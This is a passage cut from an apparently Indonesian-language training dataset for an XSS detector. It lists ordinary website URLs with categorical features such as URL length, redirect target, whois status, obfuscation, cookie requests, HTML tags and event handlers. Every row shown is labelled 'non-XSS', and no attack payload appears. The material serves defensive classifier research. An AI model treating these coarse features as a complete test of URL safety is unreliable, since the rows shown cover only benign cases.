ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.cecm.sfu.ca/organics/papers/granville/index.html;Antara 54 dan 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.cehandbook.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.changyuhx.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.chevrolet.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.chpconsulting.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.chrysler.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.cicr-columbia.org/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.cicr-icrc.ca/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.cim.ca/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.cis.upenn.edu/~giorgi/cl.html;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.citigroup.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.cmth.ph.ic.ac.uk/people/a.mackinnon/Lectures/compphys/node24.html;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.coloradotheatreguild.org/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.complexity-society.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.complinet.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.concert-reviews.co.uk/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.conferencealerts.com/peace.htm;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.coolissues.com/mathematics/Navier-Stokes/nstokes.htm;Antara 54 dan 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.crisisnavigator.org/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.crpc.rice.edu/newsletters/oct94/director.html;Antara 54 dan 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.cs.cmu.edu/~guyb/realworld.html;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.cs.cmu.edu/~scandal/research-groups.html;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.cs.cmu.edu/afs/cs.cmu.edu/project/ai-repository/ai/0.html;Antara 54 dan 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.cs.cmu.edu/Groups/AI/html/faqs/top.html;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.cs.iastate.edu/~honavar/hybrid-ai.html;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.cs.pitt.edu/~kirk/algorithmcourses/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.cs.rit.edu/~ncs/parallel.html;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.cs.ucr.edu/~stelo/pattern.html;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.curtainup.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.cut-the-knot.org/ctk/August2001.shtml;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.cut-the-knot.org/ctk/Parrondo.shtml;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.daimler.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.dieteren.be/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tidak tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.dodge.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.dtcc.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.dutchforce.com/~eforum/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.eandcchemicals.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.eecs.umich.edu/gasm/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.eli.sdsu.edu/courses/fall95/cs660/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.eli.sdsu.edu/courses/fall95/cs660/notes/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.engr.unl.edu/~glibrary/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.enhance-auto.jp/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.equistrip.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tidak tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.euroncap.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.faqs.org/faqs/robotics-faq/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.fastenterprises.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.firestonecompleteautocare.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.ford.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.fundforpeace.org/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.gecapital.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.gellerco.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.generation5.org/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.geuz.org/getdp/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.gm.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.gmacfs.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.gmc.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.gmchina.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.gn-50uma.de/alula/essays/Moree/Moree.en.shtml;Antara 54 dan 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.goodresume.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.greatchem.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.gridcomputing.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.gtislig.org/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.hampshire.edu/academics/pawss.htm;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.hbmeyer.de/taupaeng.htm;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.hevychem.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.hlcmklam.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.h-net.org/~women/bibs/mas.html;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.hoise.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.holden.com.au/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.honda.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.hongyechem.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.hotelmule.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.howstuffworks.com/augmented-reality.htm;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.howstuffworks.com/singing-fish.htm;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.huaouchem.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.humanities.mcmaster.ca/~peace/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.intelligentfirm.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.inwap.com/pdp10/hbaker/hakmem/cf.html;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.ipcs.org/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.irisa.fr/Gowachin/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.jasondoucette.com/worldrecords.html;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database 